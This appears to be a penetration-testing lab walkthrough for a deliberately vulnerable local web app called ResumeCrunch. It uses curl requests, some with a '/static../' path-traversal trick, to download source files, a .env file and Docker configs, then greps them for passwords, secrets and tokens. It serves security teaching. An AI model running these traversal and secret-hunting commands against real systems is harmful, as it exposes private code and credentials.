# Lab 04 - Locate Source Code and Requirements.txt

## Objective

Locate and download the application's source code and `requirements.txt` file to understand the technology stack and prepare for vulnerability analysis.

## Background

The `requirements.txt` file is crucial for Python applications as it:
- Lists all Python package dependencies
- Specifies package versions
- Can reveal outdated or vulnerable libraries
- Helps understand the application's functionality

## Steps

### 1. Review Your dirb Findings

From the previous lab, you should have discovered paths to:
- `requirements.txt`
- Potentially the source code directory

### 2. Download requirements.txt

Use the path discovered in the previous lab:

```bash
# Download the file
curl http://localhost:8080/requirements.txt -o requirements.txt

# View the contents
cat requirements.txt
```

**Alternative methods if the above doesn't work:**

```bash
# Try with static path
curl http://localhost:8080/static/requirements.txt -o requirements.txt

# Try path traversal if needed
curl http://localhost:8080/static../requirements.txt -o requirements.txt
```

### 3. Analyze the Requirements File

Examine the dependencies and their versions:

```bash
cat requirements.txt
```

Look for:
- **Package names** - What libraries does the app use?
- **Version numbers** - Are they pinned (specific version) or loose?
- **Old versions** - Compare versions to latest releases
- **Known vulnerable packages** - Packages with security advisories

### 4. Locate Application Source Code

Try to download the main application files:

```bash
# Try common Python application files
curl http://localhost:8080/app.py -o app.py
curl http://localhost:8080/main.py -o main.py
curl http://localhost:8080/wsgi.py -o wsgi.py

# Try in static directory
curl http://localhost:8080/static../app.py -o app.py

# Try other common files
curl http://localhost:8080/config.py -o config.py
curl http://localhost:8080/.env -o .env
```

### 5. Look for Docker Configuration

Docker files can reveal a lot about the application structure:

```bash
# Try to get Dockerfile
curl http://localhost:8080/Dockerfile -o Dockerfile
curl http://localhost:8080/static../Dockerfile -o Dockerfile

# Try docker-compose.yml
curl http://localhost:8080/docker-compose.yml -o docker-compose.yml
curl http://localhost:8080/static../docker-compose.yml -o docker-compose.yml
```

### 6. Create a Local Analysis Directory

Organize your findings:

```bash
# Create analysis directory
mkdir -p resumecrunch-analysis
cd resumecrunch-analysis

# Download all available files
curl http://localhost:8080/requirements.txt -o requirements.txt
curl http://localhost:8080/static../app.py -o app.py 2>/dev/null
curl http://localhost:8080/static../Dockerfile -o Dockerfile 2>/dev/null
```

### 7. Examine the Source Code (if obtained)

If you successfully downloaded source code files, review them for:

```bash
# Search for sensitive information
grep -i "password" *.py
grep -i "secret" *.py
grep -i "api_key" *.py
grep -i "token" *.py

# Look for database connections
grep -i "database" *.py
grep -i "db_" *.py

# Find Redis usage
grep -i "redis" *.py
grep -i "cache" *.py
```

### 8. Document the Technology Stack

Create a technology inventory:

```bash
cat > tech-stack.md << EOF
# ResumeCrunch Technology Stack

## Python Packages
(from requirements.txt)
- Flask: Web framework
- Redis: Caching layer
- [Add others found]

## Infrastructure
- Nginx: Web server/reverse proxy
- Docker: Containerization

## Potential Vulnerabilities
- [List any obviously outdated packages]
- [Note packages with known CVEs]

## Interesting Findings
- [Document any hardcoded credentials]
- [Note configuration issues]
EOF
```

### 9. Check Package Versions

For each package in requirements.txt, note the version:

```bash
# Example format in requirements.txt:
# Flask==2.0.1
# redis==3.5.3
# Werkzeug==2.0.1
```

Compare these versions with current releases:

```bash
# Check latest version (requires pip)
pip index versions Flask
pip index versions redis
```

## Example requirements.txt Analysis

If your `requirements.txt` looks like this:

```
Flask==2.0.1
redis==3.5.3
Werkzeug==2.0.1
Jinja2==3.0.1
```

**Questions to ask:**
1. When were these versions released?
2. Are there newer versions available?
3. Do any have known CVEs?
4. What functionality does each package provide?

## Verification

- [ ] Successfully downloaded `requirements.txt`
- [ ] Identified all Python dependencies
- [ ] Attempted to locate source code files
- [ ] Documented the technology stack
- [ ] Noted package versions

## Expected Findings

You should have discovered:
- A `requirements.txt` file with Python dependencies
- Potentially some application source code
- Information about the application architecture
- Package versions that may be outdated

## Next Steps

With `requirements.txt` in hand, proceed to [Lab 05 - Test for Known Vulnerabilities](lab-05-test-vulns.md) to scan for known vulnerabilities using `pip-audit`.

---

[← Previous: Path Traversal Testing](lab-03-path-traversal.md) | [Next: Test for Vulnerabilities →](lab-05-test-vulns.md)
